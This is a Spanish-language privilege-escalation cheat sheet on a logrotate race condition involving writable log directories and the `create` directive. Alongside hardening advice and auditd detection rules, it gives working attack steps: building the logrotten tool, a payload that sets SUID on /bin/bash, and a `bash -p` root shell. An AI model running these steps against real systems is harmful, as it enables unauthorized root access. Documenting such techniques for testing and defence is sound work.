---
topic: "Carrera de logrotate: directorio escribible y opción create"
tags: [linux, privesc, logrotate, race-condition, symlink]
---

# Carrera de logrotate: directorio escribible y opción `create`

[🇬🇧 English](logrotate-race.en.md) | **Español**

## Idea

`logrotate` rota ficheros de log con privilegios de quien lo ejecuta, normalmente root. Si el directorio que contiene el log es escribible por un usuario sin privilegios y la configuración usa `create`, entre el `rename` del directorio y la creación del fichero nuevo hay una ventana en la que un enlace simbólico colocado por el atacante redirige la escritura. El resultado es un fichero con contenido controlado y dueño del atacante en una ruta de root.

No es una CVE: es una condición de configuración. La herramienta que lo automatiza es `logrotten`.

## Cuándo aplica

Se necesitan tres cosas a la vez:

1. Un `logrotate` ejecutado por root (cron, systemd timer o script) sobre una ruta concreta.
2. La directiva `create` (o `createolddir`) en esa configuración.
3. Que el directorio del log, o su padre, sea escribible por el usuario atacante.

Sin `create`, `logrotate` no crea el fichero nuevo y la carrera no sirve. Con `copytruncate` tampoco.

No hay una versión que lo arregle por sí sola: `logrotten` se ha probado con 3.8.6, 3.11.0, 3.15.0 y 3.18.0, y el fallo es de configuración (propietario del log y directiva `su`).

## Comprobación

```bash
pspy -pf -i 1000            # ver el logrotate y su config
logrotate --version         # sin versión corregida universal: depende de la configuración
ls -ld /ruta/del/log
cat /etc/logrotate.d/<servicio>
```

## Comandos

```bash
git clone https://codeberg.org/whotwagner/logrotten
cd logrotten && gcc -o logrotten logrotten.c

printf '#!/bin/sh\nchmod u+s /bin/bash\n' > payload
./logrotten -p ./payload /home/<USER>/backups/access.log
```

`logrotten` renombra el directorio del log y coloca un enlace al destino que interese (`/etc/bash_completion.d/`, `/etc/cron.d/`, un `authorized_keys`). Cuando root ejecuta `logrotate -f`, el `create` sigue el enlace y escribe el fichero con el contenido del log, que el atacante controla.

El disparo posterior depende del destino: un login local de root que cargue completions, un cron que lea el directorio o un servicio que ejecute el fichero.

```bash
bash -p                     # conserva el SUID
id
```

## Variantes

- Envolver el payload en un script que se ejecute solo si `$EUID` es 0, para no romper la sesión del usuario.
- Repetir la carrera en bucle: la ventana es de milisegundos y falla a menudo.
- Usar el propio log como vector de contenido (`printf '<?php ...'`) cuando el destino es un directorio web.
- Si el log está en un subdirectorio del home, comprobar si el home entero es escribible: a veces basta con mover el directorio.

## Blindaje

- Propietario `root:root` y sin escritura de grupo/otros en los directorios de logs.
- Evitar `create` sobre rutas de usuario; usar `copytruncate` o rotar desde un servicio con su propio usuario.
- Revisar las configuraciones de `/etc/logrotate.d/` que apunten a homes o a directorios de aplicaciones.
- Monitorizar cambios de propietario y enlaces en directorios de logs.

## Detección

- `auditd`: `-w /etc/bash_completion.d -p wa`, `-w /etc/cron.d -p wa`, `-w /home -p wa`.
- Eventos de `rename`/`symlink` sobre directorios de logs seguidos de creación de ficheros propiedad de un usuario.
- `logrotate` con `-f` invocado desde un script propio y salida con errores de permisos.
- Ficheros nuevos con bit SUID en `/bin`, `/usr/bin` o `/tmp`.

## Referencias

- <https://www.exploit-db.com/exploits/47466>
- <https://codeberg.org/whotwagner/logrotten>
- <https://linux.die.net/man/8/logrotate>
- <https://attack.mitre.org/techniques/T1068/>
